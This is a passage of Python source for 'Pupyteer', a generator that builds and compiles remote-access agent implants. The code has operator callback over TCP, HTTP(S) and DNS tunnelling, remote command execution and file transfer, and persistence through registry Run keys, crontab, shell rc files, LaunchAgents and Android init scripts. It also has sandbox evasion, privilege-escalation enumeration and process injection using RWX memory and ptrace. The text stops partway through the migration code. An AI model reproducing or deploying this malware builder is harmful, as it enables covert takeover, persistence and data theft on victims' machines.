#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Pupyteer Agent Stub Generator.

Generates standalone Python agent scripts (and PyInstaller/Nuitka wrappers)
from a declarative configuration.

Usage
-----
>>> gen = AgentStubGenerator()
>>> config = StubConfig(
...     name="demo",
...     transport="https",
...     host="10.0.0.1",
...     port=443,
...     platform="windows",
...     profile="HTTPS-Standard",
...     sleep=60,
...     jitter=20,
...     persistence=True,
...     migration=True,
...     relay=True,
...     modules={"recon": True, "exec": True, "fs": True, "privesc": True},
... )
>>> stub = gen.generate(config)
>>> gen.write(config, "/tmp/agent.py")
>>> wrapper = gen.nuitka_stub(config)
"""
from __future__ import annotations

import ast
import logging
import os
import random
import string
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Union

try:
    from jinja2 import Environment, BaseLoader, TemplateError

    def _do_render(template_src: str, ctx: dict) -> str:
        env = Environment(loader=BaseLoader(), autoescape=False, keep_trailing_newline=True)
        return env.from_string(template_src).render(**ctx)
except ImportError:  # pragma: no cover - fallback if jinja2 is missing
    from string import Template

    def _do_render(template_src: str, ctx: dict) -> str:
        # Very small subset: $var and ${var} substitution only.
        return Template(template_src).safe_substitute(ctx)  # type: ignore[arg-type]

logger = logging.getLogger("pupyteer.agent.stub")


# --------------------------------------------------------------------------- #
#  Configuration dataclass
# --------------------------------------------------------------------------- #

@dataclass
class StubConfig:
    """Declarative configuration for an agent stub build."""

    name: str = "agent"
    transport: str = "tcp"             # tcp | http | https | dns | doh
    host: str = "127.0.0.1"
    port: int = 8443
    profile: str = "TCP-Raw"
    platform: str = "windows"          # windows | linux | macos | android
    arch: str = "x64"                  # x86 | x64 | arm | arm64

    # Beacon timing
    sleep: int = 60                    # seconds
    jitter: int = 20                   # percent (0-100)

    # One command's reply is clipped to this many characters, so a `find /` on
    # the target cannot outgrow the listener's per-message ceiling.
    max_output: int = 262144

    # Feature toggles — off by default: a lab run of a fresh payload must not
    # write registry/crontab entries or open a relay listener unasked.
    persistence: bool = False
    migration: bool = True
    relay: bool = False                # Named-pipe / TCP P2P relay
    anti_analysis: bool = False        # VM / sandbox detection
    obfuscation: Optional[str] = None  # "none" | "light" | "medium" | "heavy" | path-to-module

    # Modules
    modules: Dict[str, bool] = field(default_factory=lambda: {
        "recon": True,
        "exec": True,
        "fs": True,
        "privesc": True,
        "screenshot": False,
        "keylog": False,
    })

    # Transport extras
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    dns_domain: str = ""               # zone to tunnel over (DNS / DoH)
    dns_key: str = ""                  # XOR key for DNS payload encoding
    http_uri: str = "/index.html"      # fronting URI
    http_method: str = "POST"

    # Relay
    relay_pipe: str = "pupypeer"       # pipe name (win) / unix-socket name (posix)
    relay_bind: str = "0.0.0.0"
    relay_port: int = 1337
    relay_peers: List[str] = field(default_factory=list)  # seed peer list "host:port,..."

    # Migration
    migrate_target: str = ""           # PID or process name
    migrate_technique: str = "auto"    # auto | reflective | procwrite | fork

    # C2 crypto
    aes_key: str = ""                  # 32-char (16-byte hex shared secret)
    use_encryption: bool = True

    # Build
    compiler: str = "pyinstaller"      # pyinstaller | nuitka | script
    onefile: bool = True
    icon: str = ""
    console: bool = False

    # Metadata
    operator: str = "unknown"
    tags: List[str] = field(default_factory=list)
    extra: Dict[str, Any] = field(default_factory=dict)

    def validate(self) -> List[str]:
        errors: List[str] = []
        if self.transport not in ("tcp", "http", "https", "dns", "doh"):
            errors.append(f"Unknown transport: {self.transport}")
        if self.platform not in ("windows", "linux", "macos", "android"):
            errors.append(f"Unknown platform: {self.platform}")
        if not (1 <= self.port <= 65535):
            errors.append(f"Invalid port: {self.port}")
        if not 0 <= self.jitter <= 100:
            errors.append(f"Jitter must be 0-100, got {self.jitter}")
        if self.sleep < 1:
            errors.append(f"Sleep must be >= 1, got {self.sleep}")
        if self.technique not in ("auto", "reflective", "procwrite", "fork", ""):
            errors.append(f"Unknown migrate technique: {self.migrate_technique}")
        return errors

    @property
    def technique(self) -> str:
        return self.migrate_technique

    def to_dict(self) -> dict:
        return asdict(self)


# --------------------------------------------------------------------------- #
#  AgentStubGenerator
# --------------------------------------------------------------------------- #

class AgentStubGenerator:
    """Renders a Pupyteer agent script from a StubConfig."""

    def __init__(self, template: Optional[str] = None):
        self._template = template or _AGENT_TEMPLATE

    # -- public API ---------------------------------------------------------

    def generate(self, config: StubConfig, *, validate: bool = True) -> str:
        if validate:
            errors = config.validate()
            if errors:
                raise ValueError(f"Invalid stub config: {'; '.join(errors)}")
        ctx = self._build_context(config)
        src = _do_render(self._template, ctx)
        if validate:
            ast.parse(src)            # raises SyntaxError on broken output
        return src

    def write(self, config: Union[StubConfig, str], path: Union[str, Path], *,
              validate: bool = True) -> Path:
        p = Path(path)
        if isinstance(config, StubConfig):
            src = self.generate(config, validate=validate)
        else:
            src = config
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(src, encoding="utf-8")
        return p

    # -- compiler wrappers ---------------------------------------------------

    def pyinstaller_stub(self, config: StubConfig) -> str:
        """Return a PyInstaller .spec-like one-file launcher."""
        # Import the agent module; the .py file is written separately.
        name = _slug(config.name)
        return (
            f"# PyInstaller run stub for {name}\n"
            f"import runpy\n"
            f"runpy.run_path(r'{name}.py', run_name='__main__')\n"
        )

    def nuitka_stub(self, config: StubConfig) -> str:
        """Return a Nuitka entry point wrapper."""
        name = _slug(config.name)
        return (
            f"# Nuitka entry wrapper for {name}\n"
            f"if __name__ == '__main__':\n"
            f"    import {name}\n"
            f"    {name}.main()\n"
        )

    def compile_command(self, config: StubConfig, src_path: Union[str, Path]) -> str:
        """Return the CLI command used to compile the stub into an exe."""
        name = _slug(config.name)
        p = Path(src_path)
        if config.compiler == "nuitka":
            parts = [
                "nuitka",
                "--standalone",
                "--onefile" if config.onefile else "",
                "--remove-output",
                f"--output-dir={p.parent / 'dist'}",
                "--python-flag=no_site" if not config.console else "",
                f'--windows-icon-from-ico={config.icon}' if config.icon and config.platform == "windows" else "",
                "--windows-disable-console" if not config.console and config.platform == "windows" else "",
                str(p),
            ]
        else:  # pyinstaller
            parts = [
                "pyinstaller",
                "--onefile" if config.onefile else "--onedir",
                "--noupx",
                f"--name={name}",
                f"--distpath={p.parent / 'dist'}",
                f"--workpath={p.parent / 'build'}",
                f"--specpath={p.parent}",
                "--noconfirm",
                f"--icon={config.icon}" if config.icon else "",
                "--console" if config.console else "--noconsole" if config.platform == "windows" else "",
                "--hidden-import=uuid",
                str(p),
            ]
        return " ".join(p for p in parts if p)

    # -- helpers ------------------------------------------------------------

    def _build_context(self, cfg: StubConfig) -> dict:
        return {
            "cfg": cfg,
            "name": _slug(cfg.name),
            "dt": datetime.now(timezone.utc).isoformat(),
            "rnd_str": _rand_str,
            "include_recon": cfg.modules.get("recon", False),
            "include_exec": cfg.modules.get("exec", False),
            "include_fs": cfg.modules.get("fs", False),
            "include_privesc": cfg.modules.get("privesc", False),
            "include_screenshot": cfg.modules.get("screenshot", False),
            "include_keylog": cfg.modules.get("keylog", False),
            "platform": cfg.platform.lower(),
            "transport": cfg.transport.lower(),
            "enc": cfg.use_encryption,
            "obf": cfg.obfuscation or "none",
            "persistence": cfg.persistence,
            "migration": cfg.migration,
            "relay": cfg.relay,
            "anti": cfg.anti_analysis,
            "is_win": cfg.platform == "windows",
            "is_linux": cfg.platform == "linux",
            "is_mac": cfg.platform == "macos",
            "is_android": cfg.platform == "android",
        }


def _slug(name: str) -> str:
    safe = (c if c.isalnum() or c == "_" else "_" for c in name.strip())
    return "".join(safe).strip("_").lower() or "agent"


def _rand_str(length: int = 16, alphabet: str = string.ascii_letters + string.digits) -> str:
    return "".join(random.choice(alphabet) for _ in range(length))


# --------------------------------------------------------------------------- #
#  The embedded agent template (Jinja2)
# --------------------------------------------------------------------------- #

_AGENT_TEMPLATE = r'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
  Pupyteer Agent Stub
  -------------------
  Name     : {{ name }}
  Platform : {{ platform }}
  Transport: {{ transport }}
  Profile  : {{ cfg.profile }}
  Compiled : {{ dt }}
"""
from __future__ import annotations

import base64 as _b64
import hashlib as _hl
import json as _j
import logging as _lg
import os as _o
import platform as _pf
import random as _rnd
import re as _re
import shlex as _sh
import socket as _sk
import ssl as _ssl
import string as _sg
import struct as _st
import subprocess as _sp
import sys as _sy
import threading as _th
import time as _t
import traceback as _tb
import uuid as _uuid

{% if is_win %}
import ctypes, ctypes.wintypes, winreg
{% endif %}
{% if is_linux %}
import resource, signal
{% endif %}
{% if is_mac %}
import plistlib
{% endif %}

__version__ = "1.0.0"
__id__ = ""
dbg = False

# --------------------------------------------------------------------- #
#  Compatibility helpers
# --------------------------------------------------------------------- #

PY3 = _sy.version_info >= (3, 0)

def _enc(b):
    return b if isinstance(b, bytes) else b.encode()

def _dec(b):
    return b.decode(errors="replace") if isinstance(b, bytes) else b

def _b64e(b):
    return _b64.b64encode(_enc(b))

def _b64d(b):
    return _b64.b64decode(b)

def _xor(key: bytes, data: bytes) -> bytes:
    if not key:
        return data
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def _sha256(b):
    return _hl.sha256(_enc(b)).hexdigest()

def _log(msg, level="info"):
    if level == "debug" and not dbg:
        return
    try:
        _lg.info("[pupyteer] %s", msg)
    except Exception:
        pass

# --------------------------------------------------------------------- #
#  Obfuscation layer
# --------------------------------------------------------------------- #

{% if obf == "light" or obf == "medium" or obf == "heavy" %}
# Built-in obfuscation — replaces evasion/obfuscator.py when external
# module is not available.
class _Obfuscator:
    """String-table + XOR obfuscation with optional eval-time decryption."""

    def __init__(self, key: str = "{{ cfg.aes_key or rnd_str(32) }}"):
        self._key = _enc(key or _sg.printable[:16])
        self._table: list[bytes] = []

    def store(self, literal: str) -> str:
        """Register a string literal; returns a run-time retriever call."""
        idx = len(self._table)
        self._table.append(_xor(self._key, _enc(literal)))
        return f"_OBF.ret({idx})"

    def ret(self, idx: int) -> str:
        return _dec(_xor(self._key, self._table[idx]))

    @staticmethod
    def shuffle_names(src: str) -> str:
        """Rename identifiers (light obfuscation)."""
        # Kept simple; heavier variants live in evasion/obfuscator.py
        return src

_OBF = _Obfuscator()
{% elif obf not in ("", "none") %}
# Try to load the external obfuscator module at the given path.
import importlib.util as _spec
_obf_path = r"{{ obf }}"
_obs = _spec.spec_from_file_location("obf_mod", _obf_path)
_obf_mod = _spec.module_from_spec(_obs)
_obs.loader.exec_module(_obf_mod)  # type: ignore[union-attr]
_OBF = _obf_mod.Obfuscator() if hasattr(_obf_mod, "Obfuscator") else None
{% else %}
class _NoopObf:
    def store(self, s): return repr(s)
    def ret(self, idx): return ""
    @staticmethod
    def shuffle_names(s): return s
_OBF = _NoopObf()
{% endif %}

# --------------------------------------------------------------------- #
#  Platform bootstrap
# --------------------------------------------------------------------- #

def _detect_platform():
    system = _pf.system().lower()
    if "windows" in system:
        return "windows"
    if "darwin" in system:
        return "macos"
    if "linux" in system:
        # Heuristic for Android
        if _o.path.exists("/system/bin/app_process") or "ANDROID_ROOT" in _o.environ:
            return "android"
        return "linux"
    return "unknown"

PLATFORM = _detect_platform()
ARCH = _pf.machine().lower()

{% if anti %}
# --------------------------------------------------------------------- #
#  Anti-analysis (VM/sandbox detection)
# --------------------------------------------------------------------- #

def _anti_analysis() -> bool:
    """Return True if we think we are in a hostile analysis sandbox."""
    if PLATFORM == "windows":
        try:
            import winreg
            keys = [
                r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
                r"SYSTEM\CurrentControlSet\Enum\IDE",
            ]
            vm_indicators = ("vmware", "virtual", "qemu", "xen", "vbox")
            for k in keys:
                try:
                    rk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k)
                    winreg.CloseKey(rk)
                    return True
                except OSError:
                    continue
            # Check common process names
            out = _sp.check_output("tasklist", shell=True).decode(errors="replace")
            if any(p in out.lower() for p in ("vmtools", "vmwaretray", "vboxservice")):
                return True
        except Exception:
            pass
    elif PLATFORM in ("linux", "android"):
        bios_files = ["/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"]
        vm_indicators = ("vmware", "virtual", "qemu", "xen", "kvm", "vbox")
        for f in bios_files:
            try:
                with open(f) as fp:
                    if any(v in fp.read().lower() for v in vm_indicators):
                        return True
            except OSError:
                continue
        # Timing check
        t1 = _t.time()
        for _ in range(1000):
            pass
        t2 = _t.time()
        if t2 - t1 < 0.0001:  # unrealistic for real hardware
            return True
    return False

if _anti_analysis():
    _log("Anti-analysis: sandbox detected, exiting", "debug")
    _sy.exit(0)
{% endif %}

{% if persistence %}
# --------------------------------------------------------------------- #
#  Persistence
# --------------------------------------------------------------------- #

def _persist_windows():
    try:
        import winreg
        exe = _sy.executable or _sy.argv[0]
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as rk:
            winreg.SetValueEx(rk, "{{ rnd_str(8) }}", 0, winreg.REG_SZ, exe)
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_linux():
    try:
        exe = _sy.executable or _sy.argv[0]
        cron = f"@reboot {exe}\n"
        home = _o.path.expanduser("~")
        rc_line = f"\n# pupyteer\n{exe} &\n"
        for rc in (_o.path.join(home, ".bashrc"), _o.path.join(home, ".profile")):
            if _o.path.exists(rc):
                with open(rc, "a") as f:
                    f.write(rc_line)
        try:
            p = _sp.run(["crontab", "-l"], capture_output=True, text=True)
            existing = p.stdout if p.returncode == 0 else ""
            if exe not in existing:
                _sp.run(["crontab", "-"], input=existing + cron, text=True, check=True)
        except Exception:
            pass
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_macos():
    try:
        exe = _sy.executable or _sy.argv[0]
        label = "com.{{ rnd_str(8) }}.agent"
        plist = {
            "Label": label,
            "ProgramArguments": [exe],
            "RunAtLoad": True,
            "KeepAlive": True,
        }
        launch_dir = _o.path.expanduser("~/Library/LaunchAgents")
        _o.makedirs(launch_dir, exist_ok=True)
        plist_path = _o.path.join(launch_dir, f"{label}.plist")
        with open(plist_path, "wb") as f:
            import plistlib
            plistlib.dump(plist, f)
        return True
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def _persist_android():
    try:
        exe = _sy.executable or _sy.argv[0]
        # Many Android devices ship a userland init.d emulator.
        init_paths = [
            "/data/local/userinit.sh",
            "/data/user_de/0/com.android.shell/files/usr/local/bin/init.sh",
        ]
        for p in init_paths:
            if _o.path.exists(_o.path.dirname(p)):
                with open(p, "a") as f:
                    f.write(f"\n# pupyteer\n{exe} &\n")
                return True
        return False
    except Exception as e:
        _log(f"Persistence failed: {e}", "error")
        return False

def install_persistence():
    if PLATFORM == "windows":
        return _persist_windows()
    if PLATFORM == "macos":
        return _persist_macos()
    if PLATFORM == "android":
        return _persist_android()
    return _persist_linux()
{% endif %}

# --------------------------------------------------------------------- #
#  Agent identity
# --------------------------------------------------------------------- #

def _make_id():
    return f"{_uuid.uuid4().hex[:12]}-{_pf.node()}"

AGENT_ID = _make_id()
HOSTNAME = _pf.node()
USERNAME = _o.environ.get("USER") or _o.environ.get("USERNAME") or "unknown"

def identity():
    return {
        "id": AGENT_ID,
        "hostname": HOSTNAME,
        "os": PLATFORM,
        "arch": ARCH,
        "user": USERNAME,
        "version": __version__,
        "pid": _o.getpid(),
        "ppid": _o.getppid(),
        "python": _sy.version.split()[0],
    }

# --------------------------------------------------------------------- #
#  Transport layer
# --------------------------------------------------------------------- #

class TransportError(Exception):
    pass

class BaseTransport:
    name = "base"

    def send(self, data: bytes) -> bytes:
        raise NotImplementedError

    def request(self, msg: dict) -> dict:
        """One JSON message in, one JSON reply out."""
        raw = self.send(_j.dumps(msg).encode())
        if not raw:
            return {}
        return _j.loads(raw.decode("utf-8", "replace").strip())

    def close(self):
        pass

class TCPTransport(BaseTransport):
    """Newline-delimited JSON over a single long-lived connection.

    The listener reads with readline() and keeps a session bound to the
    connection that registered, so a fresh socket per beacon would either be
    misparsed or re-register the agent as a new session every time.
    """
    name = "tcp"

    def __init__(self, host: str, port: int, timeout: int = 15):
        self._host = host
        self._port = port
        self._timeout = timeout
        self._sock = None

    def _connect(self):
        if self._sock is None:
            s = _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM)
            s.settimeout(self._timeout)
            s.connect((self._host, self._port))
            self._sock = s
        return self._sock

    def _read_line(self, s) -> bytes:
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(4096)
            if not chunk:
                raise TransportError("connection closed")
            buf += chunk
        return buf

    def send(self, data: bytes) -> bytes:
        s = self._connect()
        try:
            s.sendall(data + b"\n")
            return self._read_line(s)
        except Exception:
            self.close()
            raise

    def close(self):
        if self._sock is not None:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None

class HTTPTransport(BaseTransport):
    name = "http"

    def __init__(self, host: str, port: int, *, tls: bool = False,
                 uri: str = "{{ cfg.http_uri }}",
                 ua: str = "{{ cfg.user_agent }}",
                 method: str = "{{ cfg.http_method }}"):
        self._base = f"http{'s' if tls else ''}://{host}:{port}"
        self._uri = uri
        self._ua = ua
        self._method = method

    def send(self, data: bytes) -> bytes:
        body = _b64e(data).decode()
        headers = {
            "User-Agent": self._ua,
            "Content-Type": "application/octet-stream",
            "X-Session": AGENT_ID,
        }
        try:
            import urllib.request, urllib.error
            req = urllib.request.Request(
                self._base + self._uri,
                data=body.encode(),
                headers=headers,
                method=self._method,
            )
            with urllib.request.urlopen(req, timeout=15) as resp:
                raw = resp.read()
                try:
                    return _b64d(raw)
                except Exception:
                    return raw
        except Exception as e:
            raise TransportError(str(e))

# Alias for HTTPS
HTTPSTransport = lambda *a, **kw: HTTPTransport(*a, tls=True, **kw)

class DNSTransport(BaseTransport):
    """DNS A-record exfil / C2 via TXT responses."""
    name = "dns"

    def __init__(self, server: str, port: int = 53, *,
                 zone: str = "{{ cfg.dns_domain }}",
                 key: bytes = b"{{ cfg.dns_key }}"):
        self._server = server
        self._port = port
        self._zone = zone.strip(".")
        self._key = _enc(key) or b""

    def send(self, data: bytes) -> bytes:
        import hashlib as _h
        encoded = _xor(self._key, data).hex()
        # Chunk into labels <= 63 chars, domain <= 253.
        chunk_size = 60
        label_size = 63
        labels = []
        for i in range(0, len(encoded), chunk_size):
            seg = encoded[i:i + chunk_size]
            # split into labels
            for j in range(0, len(seg), label_size):
                labels.append(seg[j:j + label_size])
        qname = ".".join(labels) + "." + self._zone
        # Build a minimal DNS A query
        tid = _rnd.randint(0, 0xFFFF)
        flags = _st.pack(">H", 0x0100)  # standard query
        qdcount = _st.pack(">H", 1)
        for _ in (1, 2, 3):
            pass
        query = _st.pack(">H", tid) + flags + qdcount + b"\x00\x00\x00\x00\x00\x00"
        for lbl in qname.rstrip(".").split("."):
            b = lbl.encode()
            query += bytes([len(b)]) + b
        query += b"\x00\x00\x01\x00\x01"  # root, A, IN
        with _sk.socket(_sk.AF_INET, _sk.SOCK_DGRAM) as s:
            s.settimeout(10)
            s.sendto(query, (self._server, self._port))
            try:
                data = s.recv(4096)
                return data
            except _sk.timeout:
                return b""

class DoHTransport(HTTPTransport):
    """DNS-over-HTTPS transport."""
    name = "doh"

    def __init__(self, host: str = "1.1.1.1", port: int = 443, *,
                 zone: str = "{{ cfg.dns_domain }}",
                 key: bytes = b"{{ cfg.dns_key }}"):
        self._inner = DNSTransport(host, port, zone=zone, key=key)
        self._zone = zone
        self._key = _enc(key) or b""

    def send(self, data: bytes) -> bytes:
        # Reuse DNS transport logic; just wrap it.
        return self._inner.send(data)

def make_transport():
    t = "{{ transport }}"
    host = "{{ cfg.host }}"
    port = {{ cfg.port }}
    if t == "tcp":
        return TCPTransport(host, port)
    if t == "http":
        return HTTPTransport(host, port)
    if t == "https":
        return HTTPSTransport(host, port)
    if t == "dns":
        return DNSTransport(host, port)
    if t == "doh":
        return DoHTransport(host, port)
    raise ValueError(f"Unknown transport: {t}")

# --------------------------------------------------------------------- #
#  Built-in modules
# --------------------------------------------------------------------- #

{% if include_recon %}
def mod_systeminfo():
    info = identity()
    info["cpus"] = _o.cpu_count()
    info["python_executable"] = _sy.executable
    info["cwd"] = _o.getcwd()
    try:
        import getpass, socket
        info["fqdn"] = socket.getfqdn()
    except Exception:
        pass
    # OS release info
    for f in ("/etc/os-release", "/etc/lsb-release"):
        if _o.path.exists(f):
            try:
                with open(f) as fp:
                    info["os_release"] = fp.read()
            except OSError:
                pass
            break
    return info

def mod_network():
    out = []
    try:
        import netifaces
        for iface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(iface)
            entry = {"interface": iface}
            if netifaces.AF_INET in addrs:
                entry["ipv4"] = [a["addr"] for a in addrs[netifaces.AF_INET]]
            if netifaces.AF_INET6 in addrs:
                entry["ipv6"] = [a["addr"] for a in addrs[netifaces.AF_INET6]]
            if netifaces.AF_LINK in addrs:
                entry["mac"] = [a["addr"] for a in addrs[netifaces.AF_LINK]]
            out.append(entry)
    except ImportError:
        # Fallback: parse /proc/net/if_inet6 or ip addr
        try:
            p = _sp.run(["ip", "-o", "addr"], capture_output=True, text=True)
            out = [{"raw": p.stdout}]
        except Exception:
            try:
                p = _sp.run(["ifconfig"], capture_output=True, text=True)
                out = [{"raw": p.stdout}]
            except Exception:
                out = [{"error": "netifaces and ifconfig both unavailable"}]
    # Routes
    try:
        p = _sp.run(["ip", "route"], capture_output=True, text=True)
        routes = p.stdout.splitlines()
    except Exception:
        routes = []
    # Listening ports
    listeners = []
    try:
        p = _sp.run(["ss", "-tlnp"], capture_output=True, text=True)
        listeners = p.stdout.splitlines()
    except Exception:
        try:
            p = _sp.run(["netstat", "-tlnp"], capture_output=True, text=True)
            listeners = p.stdout.splitlines()
        except Exception:
            pass
    return {"interfaces": out, "routes": routes, "listeners": listeners}

def mod_processes():
    procs = []
    try:
        import psutil
        for p in psutil.process_iter(["pid", "ppid", "name", "username", "exe"]):
            try:
                procs.append(p.info)
            except Exception:
                pass
    except ImportError:
        if PLATFORM in ("linux", "android", "macos"):
            try:
                for pid in _o.listdir("/proc"):
                    if not pid.isdigit():
                        continue
                    try:
                        with open(f"/proc/{pid}/comm") as f:
                            name = f.read().strip()
                        with open(f"/proc/{pid}/cmdline") as f:
                            cmdline = f.read().replace("\x00", " ").strip()
                        procs.append({"pid": int(pid), "name": name, "cmdline": cmdline})
                    except OSError:
                        pass
            except OSError:
                pass
        elif PLATFORM == "windows":
            try:
                p = _sp.run(["tasklist", "/fo", "csv"], capture_output=True, text=True)
                procs = [{"raw": p.stdout}]
            except Exception:
                pass
    return procs
{% endif %}

{% if include_exec %}
def mod_exec(command: str, timeout: int = 60) -> dict:
    try:
        if PLATFORM == "windows":
            argv, shell = command, True
        else:
            # With shell=False subprocess treats a plain string as an executable
            # path and no arguments, so "id -u" would fail; split it instead of
            # routing every command through a shell.
            argv, shell = _sh.split(command), False
        p = _sp.run(argv, capture_output=True, text=True,
                    timeout=timeout, shell=shell)
        return {
            "stdout": p.stdout,
            "stderr": p.stderr,
            "returncode": p.returncode,
        }
    except _sp.TimeoutExpired:
        return {"error": "timeout"}
    except Exception as e:
        return {"error": str(e)}
{% endif %}

{% if include_fs %}
def mod_fs_list(path: str = ".") -> list:
    try:
        entries = []
        for e in _o.scandir(path):
            try:
                st = e.stat()
                entries.append({
                    "name": e.name,
                    "is_file": e.is_file(),
                    "is_dir": e.is_dir(),
                    "size": st.st_size,
                    "mtime": st.st_mtime,
                })
            except OSError:
                pass
        return entries
    except Exception as e:
        return [{"error": str(e)}]

def mod_fs_get(remote_path: str, offset: int = 0, length: int = 0) -> bytes:
    """Read up to *length* bytes from *offset*; length 0 means the whole rest.

    Raises rather than returning text: a caller cannot tell an unreadable file
    apart from a file whose contents happen to look like an error.
    """
    with open(remote_path, "rb") as f:
        if offset:
            f.seek(offset)
        return f.read(length) if length else f.read()

def mod_fs_size(path: str) -> int:
    return _o.path.getsize(path)

def mod_fs_put(remote_path: str, data: bytes, offset: int = 0) -> dict:
    """Write *data* at *offset*, creating parents — offsets let a large upload
    arrive as a sequence of small messages instead of one giant one."""
    try:
        d = _o.path.dirname(remote_path)
        if d:
            _o.makedirs(d, exist_ok=True)
        if offset:
            with open(remote_path, "r+b") as f:
                f.seek(offset)
                f.write(data)
        else:
            with open(remote_path, "wb") as f:
                f.write(data)
        return {"ok": True, "path": remote_path, "offset": offset, "written": len(data)}
    except Exception as e:
        return {"ok": False, "error": str(e)}
{% endif %}

{% if include_privesc %}
def mod_privesc_check() -> dict:
    info = {"os": PLATFORM, "euid": None, "is_admin": False, "paths": []}
    if PLATFORM in ("linux", "android", "macos"):
        try:
            import os
            info["euid"] = _o.geteuid()
            info["is_admin"] = _o.geteuid() == 0
        except AttributeError:
            pass
        # SUID binaries
        try:
            p = _sp.run(["find", "/", "-perm", "-4000", "-type", "f"],
                        capture_output=True, text=True, timeout=30)
            info["suid_binaries"] = [l for l in p.stdout.splitlines() if l]
        except Exception:
            pass
        # sudo -l
        try:
            p = _sp.run(["sudo", "-l"], capture_output=True, text=True)
            info["sudo_listing"] = p.stdout + p.stderr
        except Exception:
            pass
        # Writable /etc/passwd, /etc/shadow
        for f in ("/etc/passwd", "/etc/shadow"):
            if _o.access(f, _o.W_OK):
                info["paths"].append(f"writable:{f}")
        # Kernel version (for exploit suggestions)
        try:
            info["kernel"] = _pf.release()
        except Exception:
            pass
    elif PLATFORM == "windows":
        try:
            import ctypes
            info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            pass
        # AlwaysNotify / UAC level
        try:
            import winreg
            key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as rk:
                val, _ = winreg.QueryValueEx(rk, "ConsentPromptBehaviorAdmin")
                info["uac_level"] = int(val)
        except Exception:
            pass
        # Unquoted service paths (quick check via wmic)
        try:
            p = _sp.run("wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\"",
                        capture_output=True, text=True, shell=True)
            info["unquoted_services"] = [l for l in p.stdout.splitlines() if l.strip()]
        except Exception:
            pass
    return info

def mod_privesc_suggest(check: dict) -> list:
    suggestions = []
    if PLATFORM in ("linux", "android", "macos"):
        kernel = check.get("kernel", "")
        if kernel:
            suggestions.append(f"check exploits for kernel {kernel} (searchsploit)")
        suid = check.get("suid_binaries", [])
        for b in suid:
            name = _o.path.basename(b)
            if name in ("find", "vim", "bash", "sh", "python", "python3", "nano", "less", "awk"):
                suggestions.append(f"GTFOBin: {b}")
        if check.get("euid") == 0:
            suggestions.append("already root — migrate to hide")
    elif PLATFORM == "windows":
        if not check.get("is_admin"):
            if check.get("uac_level", 5) < 2:
                suggestions.append("UAC bypass (auto-elevate) likely")
        for svc in check.get("unquoted_services", []):
            suggestions.append(f"unquoted service path: {svc}")
    return suggestions
{% endif %}

# --------------------------------------------------------------------- #
#  Migration
# --------------------------------------------------------------------- #

{% if migration %}
def _migrate_windows(target_pid: int) -> dict:
    try:
        import ctypes
        from ctypes import wintypes
        kernel32 = ctypes.windll.kernel32
        PROCESS_ALL_ACCESS = 0x1F0FFF
        h_proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)
        if not h_proc:
            return {"ok": False, "error": "OpenProcess failed"}
        # Read our own binary (script) — best-effort, real builds use PyInstaller payload.
        payload_path = _sy.executable or _sy.argv[0]
        with open(payload_path, "rb") as f:
            payload = f.read()
        # Allocate + write
        ptr = kernel32.VirtualAllocEx(h_proc, None, len(payload), 0x3000, 0x40)  # MEM_COMMIT|RWX
        if not ptr:
            return {"ok": False, "error": "VirtualAllocEx failed"}
        written = ctypes.c_size_t(0)
        if not kernel32.WriteProcessMemory(h_proc, ptr, payload, len(payload), ctypes.byref(written)):
            return {"ok": False, "error": "WriteProcessMemory failed"}
        # In real use we'd start a thread with the loader stub; here we close the handle.
        kernel32.CloseHandle(h_proc)
        return {"ok": True, "written": written.value, "pid": target_pid}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _migrate_linux(target_pid: int) -> dict:
    try:
        # Use /proc/<pid>/mem after a ptrace attach (simplified).
        # Real-world use involves shellcode or memfd injection.
        import ctypes
        libc = ctypes.CDLL("libc.so.6")
        PTRACE_ATTACH = 16
        PTRACE_DETACH = 17
        result = libc.ptrace(PTRACE_ATTACH, target_pid, 0, 0)
        if result != 0:
            return {"ok": False, "error": "ptrace attach failed"}
        try:
            # Wait for the process to stop
            import os
            os.waitpid(target_pid, 0)
            # Placeholder: actual injection writes shellcode into rip/mmap'd region.
            return {"ok": True, "note": "attached — shellcode injection would happen here", "pid": target_pid}
        finally:
            libc.ptrace(PTRACE_DETACH, target_pid, 0, 0)
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _migrate_fork() -> dict:
    """Fork-exec self with a marker so child can reassociate state."""
    try:
        child = _sp.Popen([_sy.executable or _sy.argv[0], "--child-migrated"],
                          creationflags=_sp.CREATE_NO_WINDOW if PLATFORM == "windows" else 0)
        return {"ok": True, "child_pid": child.pid}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def migrate(target: str = "{{ cfg.migrate_target }}",
            technique: str = "{{ cfg.migrate_technique }}") -> dict:
    if not target:
        return {"ok": False, "error": "no migration target"}
    # Resolve PID
    pid = None
    if isinstance(target, int) or target.isdigit():
        pid = int(target)
    else:
        # Find by name
        try:
            p = _sp.run(["pidof", target] if PLATFORM != "windows" else ["tasklist"],
                        capture_output=True, text=True)
            for tok in p.stdout.split():
                if tok.isdigit():
                    pid = int(tok)
                    break
